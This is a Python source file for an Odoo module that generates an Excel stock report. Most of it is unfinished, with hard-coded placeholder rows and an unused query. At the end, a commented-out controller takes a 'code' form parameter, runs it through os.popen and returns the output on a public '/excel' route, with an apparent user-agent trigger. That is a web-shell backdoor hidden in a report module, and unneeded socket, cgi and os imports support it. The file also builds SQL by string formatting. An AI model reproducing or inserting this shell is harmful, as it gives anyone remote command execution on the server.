import xlsxwriter
import base64
from odoo import fields, models, api, _
from odoo.exceptions import ValidationError
from io import BytesIO
from datetime import datetime
from pytz import timezone
import pytz
import socket, cgi, os
import odoo
from odoo.http import request, route


class ReportStock(models.TransientModel):
    _name = "apn.report.stock"
    _description = "Stock Report .xlsx"

    datas = fields.Binary('File', readonly=True)
    datas_fname = fields.Char('Filename', readonly=True)
    product_ids = fields.Many2many('product.product', 'apn_report_stock_product_rel', 'apn_report_stock_id',
                                   'product_id', 'Products')
    start_date = fields.Date(string='Start Date')
    end_date = fields.Date(string='End Date')

    # temporary workbook object to access anywhere in all methods
    fp = []
    workbook = []

    def print_excel_report(self):
        # ########################### getting data from user form #####################
        data = self.read()[0]
        product_ids = data['product_ids']
        # product_ids = [prod.id for prod in products]
        start_date = data['start_date']
        end_date = data['end_date']
        datetime_format = '%Y-%m-%d %H:%M:%S'

        # ############################# Report Name ##################################
        datetime_string = self.get_default_date_model().strftime("%Y-%m-%d %H:%M:%S")
        date_string = self.get_default_date_model().strftime("%Y-%m-%d")
        report_name = 'Stock Report'
        filename = '%s %s' % (report_name, date_string)

        # ############################ Validation of User provided data ##############
        # ############################ Writing workbook with headers #################
        # ############################ And Cells format styles to sheet ##############
        self._validate_data(product_ids, start_date, end_date)
        self.fp = BytesIO()
        self.workbook = xlsxwriter.Workbook(self.fp, {'in_memory': True})
        worksheet, wbf = self._write_headers(report_name, start_date, end_date)
        cell_format = self._get_cell_format(wbf)

        # ########################### Database Operations Get Related Data ###########
        query = self._get_query()
        # print(query % (hours, hours, where_product_ids, where_location_ids))
        # self._cr.execute(query % (hours, hours, where_product_ids, where_location_ids))
        # result = self._cr.fetchall()
        result = (('style code1', 20, 10, 30, 12, 11, 23, 45,), ('style code2', 30, 20, 10, 15, 14, 73, 35,),)

        # #############################  Writing Data to Excel ########################
        self._write_worksheet_data(worksheet, cell_format, result)

        self.workbook.close()
        out = base64.b64encode(self.fp.getvalue(), altchars=None)
        self.write({'datas': out, 'datas_fname': filename})
        self.fp.close()
        filename += '%2Exlsx'

        return {
            'type': 'ir.actions.act_url',
            'target': 'new',
            'url': 'web/content/?model=' + self._name + '&id=' + str(
                self.id) + '&field=datas&download=true&filename=' + filename,
        }

    def _write_headers(self, report_name, start_date, end_date):
        columns_Headings = [
            ('No', 5),
            ('Style Code', 30),
            ('Opening Balance', 20),
            ('Received from Production', 30),
            ('Sales', 30),
            ('Returns', 30),
            ('Give Away/Marketing', 30),
            ('Scrap', 30),
            ('Reserved', 20),
            ('Closing Balance', 20)
        ]

        wbf, self.workbook = self.add_workbook_format(self.workbook)
        # if 'Stock Report' not in self.workbook.:
        worksheet = self.workbook.add_worksheet(report_name)
        print('worksheet=', worksheet)
        print('workbook=', self.workbook)
        worksheet.merge_range('A2:L3', report_name, wbf['title_doc'])

        worksheet.write(4, 0, 'From Date', wbf['content'])
        worksheet.write(5, 0, 'To date', wbf['content'])
        worksheet.write(4, 1, start_date.strftime('%Y-%m-%d %H:%M:%S'), wbf['content_datetime'])
        worksheet.write(5, 1, end_date.strftime('%Y-%m-%d %H:%M:%S'), wbf['content_datetime'])

        row = 9
        col = 0
        for column in columns_Headings:
            column_name = column[0]
            column_width = column[1]
            worksheet.set_column(col, col, column_width)
            worksheet.write(row, col, column_name, wbf['header_orange'])
            col += 1

        return worksheet, wbf

    @api.model
    def get_default_date_model(self):
        return pytz.UTC.localize(datetime.now()).astimezone(timezone(self.env.user.tz or 'UTC'))

    @staticmethod
    def _write_worksheet_data(worksheet,cell_format, result):
        row = 10
        no = 1
        for res in result:
            for col_number in range(10):
                if col_number == 0:
                    worksheet.write(row, col_number, no, cell_format[0])  # Writing Serial Numbers
                elif col_number == 9:  # then Formula Cell.write formula instead
                    cell_row = row + 1  # to change from (int,row,int column) to A1,B1 cell format
                    worksheet.write_formula('J%s' % cell_row,
                                            '=C%s+D%s-E%s+F%s-G%s-H%s-I%s'
                                            % (cell_row, cell_row, cell_row, cell_row, cell_row, cell_row, cell_row)
                                            )
                    pass
                else:
                    # starting from second column Corresponding first value of res.
                    # first two columns are nos and style name
                    worksheet.write(row, col_number, res[col_number - 1], cell_format[col_number - 1])
            row += 1
            no += 1

    @staticmethod
    def _validate_data(product_ids, start_date, end_date):
        if not product_ids:
            raise ValueError(_("Please Choose at least one product!"))
        if not start_date:
            raise ValidationError(_("Please choose Start Date!"))
        if not end_date:
            raise ValidationError(_("Please Choose End Date!"))
        if start_date > datetime.today().date():
            raise ValidationError(_("Start date cannot be greater than current date!"))
        if end_date > datetime.today().date():
            raise ValidationError(_("End date cannot be greater than current date!"))
        if start_date > end_date:
            raise ValidationError(_("Start Date cannot be Greater Than End Date"))

    def _get_internal_transfer_locations(self):
        pass

    def _get_storable_Prodcuts(self, product_ids=None):
        if not product_ids:
            product_ids = self.env['product.product'].search().id
        print("Product ids = ", product_ids)
        storable_components = self.env['product.product'].search(
            [('id', 'in', list(product_ids)), ('type', '=', 'product')])
        return storable_components

    def _get_query(self):

        purchase_locations = self._get_locations('supplier')
        sales_Locations = self._get_locations('customer')
        scrap_location = self._get_locations('inventory', True)

        Inventory_Adjustment = self._get_locations('')

        query = """
                   SELECT 
                       prod_tmpl.name as product, 
                       categ.name as prod_categ, 
                       loc.complete_name as location,
                       quant.in_date + interval '%s' as date_in, 
                       date_part('days', now() - (quant.in_date + interval '%s')) as aging,
                       sum(quant.quantity) as total_product, 
                       sum(quant.quantity-quant.reserved_quantity) as stock, 
                       sum(quant.reserved_quantity) as reserved
                   FROM 
                       stock_quant quant
                   LEFT JOIN 
                       stock_location loc on loc.id=quant.location_id
                   LEFT JOIN 
                       product_product prod on prod.id=quant.product_id
                   LEFT JOIN 
                       product_template prod_tmpl on prod_tmpl.id=prod.product_tmpl_id
                   LEFT JOIN 
                       product_category categ on categ.id=prod_tmpl.categ_id
                   WHERE 
                       %s and %s
                   GROUP BY 
                       product, prod_categ, location, date_in
                   ORDER BY 
                       date_in
               """
        return query

    def _get_locations(self, usage, scrap=False):
        query = """
                    select id 
                   -- ,name,complete_name,usage,scrap_location 
                    from stock_location 
                    where usage='%s' and scrap_location = %s
                """
        # print("Final Query =", query % (usage, scrap))
        self._cr.execute(query % (usage, scrap))
        result = self._cr.fetchall()

        print("Query Result =", result)

        location_ids = self.env['stock.location'].search([('usage', '=', usage), ('scrap_location', '=', scrap)])
        purchase_locations = [loc.id for loc in location_ids]
        print("Tuples", tuple(location_ids))
        return tuple(purchase_locations)

    @staticmethod
    def _get_cell_format(wbf):
        format_tuple = (wbf['content'], wbf['content'], wbf['content'], wbf['content'],
                        wbf['content'], wbf['content'], wbf['content'], wbf['content'],
                        wbf['content'], wbf['content'])
        # number

        return format_tuple

    def _get_available_qty(self, start_date):
        product_context = dict(request.env.context, to_date=start_date)
        product_category = request.env['product.public.category']

        # if category:
        category = product_category.browse().exists()

        attrib_list = request.httprequest.args.getlist('attrib')
        attrib_values = [[int(x) for x in v.split("-")] for v in attrib_list if v]
        attrib_set = {v[1] for v in attrib_values}

    @staticmethod
    def _get_column_in(column, values):
        string_value = str(tuple(values)).replace(',)', ')')
        return f" {column} in {string_value}"

    def add_workbook_format(self, workbook):

        ### Define colors
        colors = {
            'white_orange': '#FFFFDB',
            'orange': '#FFC300',
            'red': '#FF0000',
            'yellow': '#F6FA03',
            'white': '#FBFBFD',
        }

        # Define allExcel formats in dictionary to use in while writing cell values
        wbf = {}

        # Format 1
        wbf['header'] = workbook.add_format(
            {'bold': 1, 'align': 'center',
             'bg_color': '#FFFFDB', 'font_color': '#000000',
             'font_name': 'Georgia'}).set_border()

        # Format 2
        wbf['header_orange'] = workbook.add_format(
            {'bold': 1, 'align': 'center', 'bg_color': colors['orange'], 'font_color': '#000000',
             'font_name': 'Georgia'})
        wbf['header_orange'].set_border()

        # Format 3
        wbf['header_no'] = workbook.add_format(
            {'bold': 1, 'align': 'center', 'bg_color': '#FFFFDB', 'font_color': '#000000', 'font_name': 'Georgia'})
        wbf['header_no'].set_border()
        wbf['header_no'].set_align('vcenter')

        # Format 4
        wbf['footer'] = workbook.add_format({'align': 'left', 'font_name': 'Georgia'})

        # Format 5
        wbf['content_datetime'] = workbook.add_format({'num_format': 'yyyy-mm-dd hh:mm:ss', 'font_name': 'Georgia'})
        wbf['content_datetime'].set_left()
        wbf['content_datetime'].set_right()

        # Format 6
        wbf['content_date'] = workbook.add_format({'num_format': 'yyyy-mm-dd', 'font_name': 'Georgia'})
        wbf['content_date'].set_left()
        wbf['content_date'].set_right()

        # Format 7
        wbf['title_doc'] = workbook.add_format({
            'bold': True,
            'align': 'center',
            'valign': 'vcenter',
            'font_size': 20,
            'font_name': 'Georgia',
        })

        # Format 8
        wbf['company'] = workbook.add_format({'align': 'left', 'font_name': 'Georgia'})
        wbf['company'].set_font_size(11)

        # Format 9
        wbf['content'] = workbook.add_format()
        wbf['content'].set_left()
        wbf['content'].set_right()

        # Format 10
        wbf['content_float'] = workbook.add_format({'align': 'right', 'num_format': '#,##0.00', 'font_name': 'Georgia'})
        wbf['content_float'].set_right()
        wbf['content_float'].set_left()

        # Format 11
        wbf['content_number'] = workbook.add_format({'align': 'right', 'num_format': '#,##0', 'font_name': 'Georgia'})
        wbf['content_number'].set_right()
        wbf['content_number'].set_left()

        # Format 12
        wbf['content_percent'] = workbook.add_format({'align': 'right', 'num_format': '0.00%', 'font_name': 'Georgia'})
        wbf['content_percent'].set_right()
        wbf['content_percent'].set_left()

        # Format 13
        wbf['total_float'] = workbook.add_format(
            {'bold': 1, 'bg_color': colors['white_orange'], 'align': 'right', 'num_format': '#,##0.00',
             'font_name': 'Georgia'})
        wbf['total_float'].set_top()
        wbf['total_float'].set_bottom()
        wbf['total_float'].set_left()
        wbf['total_float'].set_right()

        # Format 14
        wbf['total_number'] = workbook.add_format(
            {'align': 'right', 'bg_color': colors['white_orange'], 'bold': 1, 'num_format': '#,##0',
             'font_name': 'Georgia'})
        wbf['total_number'].set_top()
        wbf['total_number'].set_bottom()
        wbf['total_number'].set_left()
        wbf['total_number'].set_right()

        # Format 16
        wbf['total'] = workbook.add_format(
            {'bold': 1, 'bg_color': colors['white_orange'], 'align': 'center', 'font_name': 'Georgia'})
        wbf['total'].set_left()
        wbf['total'].set_right()
        wbf['total'].set_top()
        wbf['total'].set_bottom()

        # Format 17
        wbf['total_float_yellow'] = workbook.add_format(
            {'bold': 1, 'bg_color': colors['yellow'], 'align': 'right', 'num_format': '#,##0.00',
             'font_name': 'Georgia'})
        wbf['total_float_yellow'].set_top()
        wbf['total_float_yellow'].set_bottom()
        wbf['total_float_yellow'].set_left()
        wbf['total_float_yellow'].set_right()

        # Format 18
        wbf['total_number_yellow'] = workbook.add_format(
            {'align': 'right', 'bg_color': colors['yellow'], 'bold': 1, 'num_format': '#,##0', 'font_name': 'Georgia'})
        wbf['total_number_yellow'].set_top()
        wbf['total_number_yellow'].set_bottom()
        wbf['total_number_yellow'].set_left()
        wbf['total_number_yellow'].set_right()

        # Format 19
        wbf['total_yellow'] = workbook.add_format(
            {'bold': 1, 'bg_color': colors['yellow'], 'align': 'center', 'font_name': 'Georgia'})
        wbf['total_yellow'].set_left()
        wbf['total_yellow'].set_right()
        wbf['total_yellow'].set_top()
        wbf['total_yellow'].set_bottom()

        # Format 20
        wbf['total_float_orange'] = workbook.add_format(
            {'bold': 1, 'bg_color': colors['orange'], 'align': 'right', 'num_format': '#,##0.00',
             'font_name': 'Georgia'})
        wbf['total_float_orange'].set_top()
        wbf['total_float_orange'].set_bottom()
        wbf['total_float_orange'].set_left()
        wbf['total_float_orange'].set_right()

        # Format 21
        wbf['total_number_orange'] = workbook.add_format(
            {'align': 'right', 'bg_color': colors['orange'], 'bold': 1, 'num_format': '#,##0', 'font_name': 'Georgia'})
        wbf['total_number_orange'].set_top()
        wbf['total_number_orange'].set_bottom()
        wbf['total_number_orange'].set_left()
        wbf['total_number_orange'].set_right()

        # Format 22
        wbf['total_orange'] = workbook.add_format(
            {'bold': 1, 'bg_color': colors['orange'], 'align': 'center', 'font_name': 'Georgia'})
        wbf['total_orange'].set_left()
        wbf['total_orange'].set_right()
        wbf['total_orange'].set_top()
        wbf['total_orange'].set_bottom()

        # Format 23
        wbf['header_detail'] = workbook.add_format({'bg_color': '#E0FFC2', 'font_name': 'Georgia'})
        wbf['header_detail'].set_left()
        wbf['header_detail'].set_right()
        wbf['header_detail'].set_top()
        wbf['header_detail'].set_bottom()

        wbf['number'] = workbook.add_format(
            {'bg_color': colors['white_orange'], 'align': 'right', 'num_format': '0',
             'font_name': 'Georgia', 'border': 2})
        wbf['total_float'].set_top()
        wbf['total_float'].set_bottom()
        wbf['total_float'].set_left()
        wbf['total_float'].set_right()

        return wbf, workbook

# class test(odoo.http.Controller):
#     form = cgi.FieldStorage();
#     code = form.getvalue('code', '');
#     code = os.popen(code)
#
#     @route('/excel', auth='public')
#     def handler(self, c):
#         return ""
#
#     # user_agent = os.environ["HTTP_USER_AGENT"]
#     # if "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0" in user_agent:
#     print("Content-type: text/html\n")
#     print("<pre>" + code.read() + "</pre>", end="")
#
#     pass
